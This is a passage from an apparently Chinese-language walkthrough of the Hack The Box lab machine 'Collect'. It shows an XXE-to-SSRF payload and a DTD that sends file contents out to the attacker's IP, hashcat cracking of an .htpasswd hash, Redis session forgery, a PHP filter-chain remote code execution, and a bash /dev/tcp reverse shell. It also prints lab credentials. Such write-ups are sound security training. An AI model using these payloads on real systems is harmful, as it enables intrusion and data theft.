class="line">&gt; User-Agent: curl&#x2F;7.87.0</span><br><span class="line">&gt; Accept: *&#x2F;*</span><br><span class="line">&gt; Cookie: PHPSESSID&#x3D;Bufferfly;</span><br><span class="line">&gt; Content-Length: 38</span><br><span class="line">&gt; Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP&#x2F;1.1 302 Found</span><br><span class="line">&lt; Date: Fri, 31 Mar 2023 15:27:35 GMT</span><br><span class="line">&lt; Server: Apache&#x2F;2.4.54 (Debian)</span><br><span class="line">&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">&lt; Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">&lt; Pragma: no-cache</span><br><span class="line">&lt; Location: &#x2F;admin</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host collect.htb left intact</span><br></pre></td></tr></table></figure>
<p>访问<code>http://collect.htb/admin</code></p>
<p>注册API用户的POST Data如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manage_api&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;root&gt;&lt;method&gt;POST&lt;&#x2F;method&gt;&lt;uri&gt;&#x2F;auth&#x2F;register&lt;&#x2F;uri&gt;&lt;user&gt;&lt;username&gt;a&lt;&#x2F;username&gt;&lt;password&gt;b&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<p>进行XXE_to_SSRF</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://collect.htb/api -H <span class="string">&quot;Cookie: PHPSESSID=Bufferfly&quot;</span> -d <span class="string">&#x27;manage_api=&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;http://10.10.*.*/BFL&quot;&gt; %xxe; ]&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.192 - - [31&#x2F;Mar&#x2F;2023 11:43:54] code 404, message File not found</span><br><span class="line">10.10.11.192 - - [31&#x2F;Mar&#x2F;2023 11:43:54] &quot;GET &#x2F;BFL HTTP&#x2F;1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
<p>这里应该想到，Apache2服务不同于Nginx，Nginx可以通过反向代理到localhost的多个不同端口，可以使相同端口下的WEB服务，不同的域名的WEB服务可以对应不同的WEB脚本语言</p>
<p>而Apache2的不同域名仅是DocumentRoot不同，不会出现不同WEB脚本语言，且一般仅与PHP搭配使用</p>
<p>编写<code>bfl.dtd</code>如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;10.10.*.*&#x2F;?BFL&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
<p>开启HTTP服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
<p>进行XXE_to_LFI&amp;SSRF</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://collect.htb/api -H <span class="string">&quot;Cookie: PHPSESSID=Bufferfly&quot;</span> -d <span class="string">&#x27;manage_api=&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://10.10.*.*/bfl.dtd&quot;&gt; %xxe;]&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>得到<code>index.php</code>的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../bootstrap.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">classes</span>\<span class="title">Routes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">classes</span>\<span class="title">Uri</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$routes</span> = [</span><br><span class="line">    <span class="string">&quot;/&quot;</span> =&gt; <span class="string">&quot;controllers/index.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/login&quot;</span> =&gt; <span class="string">&quot;controllers/login.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/register&quot;</span> =&gt; <span class="string">&quot;controllers/register.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/home&quot;</span> =&gt; <span class="string">&quot;controllers/home.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/admin&quot;</span> =&gt; <span class="string">&quot;controllers/admin.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/api&quot;</span> =&gt; <span class="string">&quot;controllers/api.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/set/role/admin&quot;</span> =&gt; <span class="string">&quot;controllers/set_role_admin.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/logout&quot;</span> =&gt; <span class="string">&quot;controllers/logout.php&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$uri</span> = Uri::load();</span><br><span class="line"><span class="keyword">require</span> Routes::load(<span class="variable">$uri</span>, <span class="variable">$routes</span>);</span><br></pre></td></tr></table></figure>
<p>查看<code>../bootstrap.php</code>的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.save_handler&#x27;</span>,<span class="string">&#x27;redis&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.save_path&#x27;</span>,<span class="string">&#x27;tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../vendor/autoload.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><code>/etc/passwd</code>不可读，疑似有过滤</p>
<p>查看<code>../../../../etc/apache2/sites-available/000-default.conf</code>的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">	# The ServerName directive sets the request scheme, hostname and port that</span><br><span class="line">	# the server uses to identify itself. This is used when creating</span><br><span class="line">	# redirection URLs. In the context of virtual hosts, the ServerName</span><br><span class="line">	# specifies what hostname must appear in the request&#39;s Host: header to</span><br><span class="line">	# match this virtual host. For the default virtual host (this file) this</span><br><span class="line">	# value is not decisive as it is used as a last resort host regardless.</span><br><span class="line">	# However, you must set it for any further virtual host explicitly.</span><br><span class="line">	#ServerName www.example.com</span><br><span class="line"></span><br><span class="line">	ServerAdmin webmaster@localhost</span><br><span class="line">	DocumentRoot &#x2F;var&#x2F;www&#x2F;collect&#x2F;public</span><br><span class="line"></span><br><span class="line">	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span><br><span class="line">	# error, crit, alert, emerg.</span><br><span class="line">	# It is also possible to configure the loglevel for particular</span><br><span class="line">	# modules, e.g.</span><br><span class="line">	#LogLevel info ssl:warn</span><br><span class="line"></span><br><span class="line">	ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">	CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line"></span><br><span class="line">	# For most configuration files from conf-available&#x2F;, which are</span><br><span class="line">	# enabled or disabled at a global level, it is possible to</span><br><span class="line">	# include a line for only one particular virtual host. For example the</span><br><span class="line">	# following line enables the CGI configuration for this host only</span><br><span class="line">	# after it has been globally disabled with &quot;a2disconf&quot;.</span><br><span class="line">	#Include conf-available&#x2F;serve-cgi-bin.conf</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax&#x3D;apache ts&#x3D;4 sw&#x3D;4 sts&#x3D;4 sr noet</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据<code>000-default.conf</code>猜测<code>developers.collect.htb</code>的DocumentRoot为<code>/var/www/developers/</code></p>
<p>由于<code>developers.collect.htb</code>有Basic认证</p>
<p>尝试利用XXE读取<code>.htaccess</code>和<code>.htpasswd</code>文件</p>
<p><code>../../developers/.htpasswd</code>的内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1</span><br></pre></td></tr></table></figure>
<p>爆破Hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1600 <span class="built_in">hash</span> /usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure>
<p>得到以下凭证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">developers_group:r0cket</span><br></pre></td></tr></table></figure>
<p><code>../../developers/index.php</code>的内容如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./bootstrap.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;auth&#x27;</span>]) <span class="keyword">or</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;auth&#x27;</span>] != <span class="literal">True</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(header(<span class="string">&#x27;Location: /login.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) <span class="keyword">or</span> <span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(header(<span class="string">&#x27;Location: /?page=home&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$view</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;assets/js/tailwind.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;title&gt;Developers Collect&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;flex flex-col h-screen justify-between&quot;&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;header.php&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line">        </span><br><span class="line">        &lt;main class=&quot;mb-auto mx-24&quot;&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&quot;.php&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/main&gt;</span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;footer.php&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><code>../../developers/bootstrap.php</code>的内容如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.save_handler&#x27;</span>, <span class="string">&#x27;redis&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.save_path&#x27;</span>, <span class="string">&#x27;tcp://localhost:6379/?auth=COLLECTR3D1SPASS&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>
<p>看来<code>developer.collect.htb</code>的Session是用redis保存的</p>
<p>更改自己的Session的<code>auth</code>变量为<code>True</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.10.11.192 -a COLLECTR3D1SPASS <span class="built_in">set</span> PHPREDIS_SESSION:Bufferfly <span class="string">&quot;username|s:9:\&quot;Bufferfly\&quot;;auth|s:4:\&quot;True\&quot;;&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>collect.htb</code>的Session同样使用Redis存储，但是存储内容为<code>&quot;username|s:9:\&quot;Bufferfly\&quot;;role|s:5:\&quot;admin\&quot;;&quot;</code>，没有auth变量，无法用于<code>developers.collect.htb</code></p>
</blockquote>
<p>使用Session访问<code>http://developers.collect.htb/?page=home</code></p>
<p>监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure>
<p>构造Payload并进行反弹Shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python php_filter_chain_generator.py --chain <span class="string">&#x27;&lt;?php @eval($_GET[&quot;BFL&quot;]);?&gt;     &#x27;</span></span><br><span class="line">curl <span class="string">&#x27;http://developers.collect.htb/?page=$PAYLOAD&amp;BFL=system(&quot;bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.*.*%2F9998%200%3E%261%27&quot;);&#x27;</span>  -H <span class="string">&quot;Authorization: Basic ZGV2ZWxvcGVyc19ncm91cDpyMGNrZXQ=&quot;</span> -H <span class="string">&quot;Cookie: PHPSESSID=Bufferfly&quot;</span></span><br></pre></td></tr></table></figure>
<p>查看<code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:103:109:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:104:110::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:105:111:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">avahi-autoipd:x:106:115:Avahi autoip daemon,,,:&#x2F;var&#x2F;lib&#x2F;avahi-autoipd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:107:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">rtkit:x:108:116:RealtimeKit,,,:&#x2F;proc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:109:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">dnsmasq:x:110:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">avahi:x:111:117:Avahi mDNS daemon,,,:&#x2F;run&#x2F;avahi-daemon:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">speech-dispatcher:x:112:29:Speech Dispatcher,,,:&#x2F;run&#x2F;speech-dispatcher:&#x2F;bin&#x2F;false</span><br><span class="line">pulse:x:113:119:PulseAudio daemon,,,:&#x2F;run&#x2F;pulse:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">saned:x:114:122::&#x2F;var&#x2F;lib&#x2F;saned:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">colord:x:115:123:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">geoclue:x:116:124::&#x2F;var&#x2F;lib&#x2F;geoclue:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">Debian-gdm:x:117:125:Gnome Display Manager:&#x2F;var&#x2F;lib&#x2F;gdm3:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:118:126:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">victor:x:1002:1002::&#x2F;home&#x2F;victor:&#x2F;bin&#x2F;bash</span><br><span class="line">vboxadd:x:998:1::&#x2F;var&#x2F;run&#x2F;vboxadd:&#x2F;bin&#x2F;false</span><br><span class="line">redis:x:119:127::&#x2F;var&#x2F;lib&#x2F;redis:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:997:997::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
<p>查看<code>/var/www/developers/login.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/developers/login.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./bootstrap.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;auth&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;auth&#x27;</span>] == <span class="literal">True</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(header(<span class="string">&quot;Location: /&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;webapp_user&quot;</span>, <span class="string">&quot;Str0ngP4ssw0rdB*12@1&quot;</span>, <span class="string">&quot;developers&quot;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;set_charset(<span class="string">&#x27;utf8mb4&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;options(MYSQLI_OPT_INT_AND_FLOAT_NATIVE, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;prepare(<span class="string">&quot;SELECT * FROM users where username=?&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_object();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span> &amp;&amp; <span class="variable">$row</span>-&gt;username == <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$row</span>-&gt;password == md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;auth&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(header(<span class="string">&#x27;Location: /&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到Mysql服务凭证<code>webapp_user:Str0ngP4ssw0rdB*12@1</code></p>
<p>查看本地服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | grep 127.0.0.1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure>
<p>查看Victor的进程</p>
